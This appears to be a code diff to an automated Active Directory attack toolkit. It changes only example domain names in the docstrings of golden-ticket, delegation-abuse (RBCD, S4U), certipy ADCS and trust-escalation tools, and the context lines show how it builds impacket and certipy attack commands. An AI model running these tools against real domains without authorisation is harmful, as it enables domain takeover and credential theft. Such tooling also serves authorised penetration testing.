@@ -54,7 +54,7 @@ class GoldenTicketTools(Toolset):
         2. The target domain (where you want to escalate)
 
         Args:
-            domain: Target domain (e.g., 'subdomain.example.local')
+            domain: Target domain (e.g., 'child.contoso.local')
             username: Valid domain username
             password: Password for the username
             dc_ip: Optional DC IP address to connect to (recommended to avoid DNS issues)
@@ -63,8 +63,8 @@ class GoldenTicketTools(Toolset):
             Domain SID and list of domain users (look for "[*] Domain SID is: ...")
 
         Example:
-            >>> get_sid("child.example.local", "user", "pass", "192.168.58.100")
-            >>> get_sid("parent.example.local", "user", "pass", "192.168.58.101")
+            >>> get_sid("child.contoso.local", "user", "pass", "192.168.58.100")
+            >>> get_sid("contoso.local", "user", "pass", "192.168.58.101")
         """
         if dc_ip:
             cmd = ["impacket-lookupsid", f"{domain}/{username}:{password}@{dc_ip}"]
@@ -110,7 +110,7 @@ class GoldenTicketTools(Toolset):
             >>> generate_golden_ticket(
             ...     "abc123...",  # krbtgt hash
             ...     "S-1-5-21-123-456-789",  # compromised domain SID
-            ...     "child.example.local",  # compromised domain
+            ...     "child.contoso.local",  # compromised domain
             ...     "S-1-5-21-111-222-333-519"  # target domain SID + 519
             ... )
         """
@@ -186,7 +186,7 @@ class DelegationTools(Toolset):
         Parses impacket-findDelegation output format:
             AccountName    AccountType    DelegationType                   DelegationRightsTo
             -----------    -----------    ---------------                  ------------------
-            svc.backup     Person         Constrained w/ Protocol Trans.   cifs/dc01
+            svc.sql        Person         Constrained w/ Protocol Trans.   cifs/dc01
             DC01$          Computer       Unconstrained                    N/A
 
         Only adds Person accounts (not Computer accounts ending in $).
@@ -338,7 +338,7 @@ class DelegationTools(Toolset):
         """Add a delegation vulnerability to state for auto-exploitation.
 
         Args:
-            account: Account with delegation (e.g., svc.backup or DC01$)
+            account: Account with delegation (e.g., svc.sql or DC01$)
             delegation_type: "constrained" or "unconstrained"
             target_spn: Target SPN for constrained delegation (e.g., cifs/dc01)
             domain: Domain name
@@ -437,7 +437,7 @@ class DelegationTools(Toolset):
             List of accounts with delegation and delegation type
 
         Example:
-            >>> find_delegation("example.local", "user", "pass", "192.168.58.10")
+            >>> find_delegation("contoso.local", "user", "pass", "192.168.58.10")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -544,7 +544,7 @@ class DelegationTools(Toolset):
             RBCD write result
 
         Example:
-            >>> rbcd_write("TARGETPC$", "S-1-5-21-...-1234", "domain.local", "user", "pass", "192.168.58.10")
+            >>> rbcd_write("TARGETPC$", "S-1-5-21-...-1234", "contoso.local", "user", "pass", "192.168.58.10")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -600,7 +600,7 @@ class DelegationTools(Toolset):
         a service ticket as any user (typically Administrator) to the target service.
 
         Args:
-            target_spn: Target SPN to get ticket for (e.g., 'cifs/TARGETPC.domain.local')
+            target_spn: Target SPN to get ticket for (e.g., 'cifs/TARGETPC.contoso.local')
             impersonate: User to impersonate (typically 'Administrator')
             domain: Target domain
             username: Username of account with delegation rights
@@ -612,7 +612,7 @@ class DelegationTools(Toolset):
             S4U attack result (includes .ccache ticket path if successful)
 
         Example:
-            >>> s4u_attack("cifs/TARGETPC.domain.local", "Administrator", "domain.local", "svc_account", password="pass")  # pragma: allowlist secret
+            >>> s4u_attack("cifs/TARGETPC.contoso.local", "Administrator", "contoso.local", "svc_account", password="pass")  # pragma: allowlist secret
         """
         resolved_password = self._resolve_password(username, domain, password)
         if (
@@ -734,7 +734,7 @@ class DelegationTools(Toolset):
             Computer creation result with credentials
 
         Example:
-            >>> add_computer("domain.local", "user", "pass", "192.168.58.10")
+            >>> add_computer("contoso.local", "user", "pass", "192.168.58.10")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -1052,7 +1052,7 @@ class CertipyTools(Toolset):
         if ca_match:
             ca_name = ca_match.group(1).strip()
 
-        # Look for CA host/DNS (e.g., "DNS Name: dc01.corp.local")
+        # Look for CA host/DNS (e.g., "DNS Name: dc01.contoso.local")
         dns_match = re.search(
             r"(?:DNS Name|Web Services|Web Enrollment)\s*:\s*([^\n\r]+)",
             certipy_output,
@@ -1157,7 +1157,7 @@ class CertipyTools(Toolset):
             ADCS enumeration results highlighting exploitable templates
 
         Example:
-            >>> certipy_find("example.local", "user", "pass", "192.168.58.10")
+            >>> certipy_find("contoso.local", "user", "pass", "192.168.58.10")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -1274,8 +1274,8 @@ class CertipyTools(Toolset):
             Certificate request result (saves .pfx file if successful)
 
         Example:
-            >>> certipy_request("example.local", "user", "pass", "192.168.58.10",
-            ...                  "example-CA", "VulnTemplate", "Administrator")
+            >>> certipy_request("contoso.local", "user", "pass", "192.168.58.10",
+            ...                  "contoso-CA", "VulnTemplate", "Administrator")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -1340,7 +1340,7 @@ class CertipyTools(Toolset):
             Authentication result including NTLM hash if successful
 
         Example:
-            >>> certipy_auth("example.local", "192.168.58.10", "administrator.pfx")
+            >>> certipy_auth("contoso.local", "192.168.58.10", "administrator.pfx")
         """
         cmd = [
             "certipy",
@@ -1414,7 +1414,7 @@ class CertipyTools(Toolset):
             Shadow credentials result (includes certificate if successful)
 
         Example:
-            >>> certipy_shadow("example.local", "user", "pass", "192.168.58.10", "Administrator")
+            >>> certipy_shadow("contoso.local", "user", "pass", "192.168.58.10", "Administrator")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -1488,7 +1488,7 @@ class CertipyTools(Toolset):
             Template modification result (saves backup of original config)
 
         Example:
-            >>> certipy_template_esc4("example.local", "user", "pass", "192.168.58.10", "ESC4")
+            >>> certipy_template_esc4("contoso.local", "user", "pass", "192.168.58.10", "ESC4")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -1657,7 +1657,7 @@ class TrustAttackTools(Toolset):
         Use after obtaining krbtgt hash from a child domain via secretsdump.
 
         Args:
-            child_domain: Child domain where you have krbtgt (e.g., "child.domain.local")
+            child_domain: Child domain where you have krbtgt (e.g., "child.contoso.local")
             username: Username with access in child domain
             password: Password for authentication
             target_domain: Parent domain to escalate to (auto-detected if omitted)
@@ -1666,7 +1666,7 @@ class TrustAttackTools(Toolset):
             Escalation result with tickets and hashes
 
         Example:
-            >>> raise_child("child.domain.local", "administrator", "pass")
+            >>> raise_child("child.contoso.local", "administrator", "pass")
         """
         cmd = [
             "raiseChild.py",
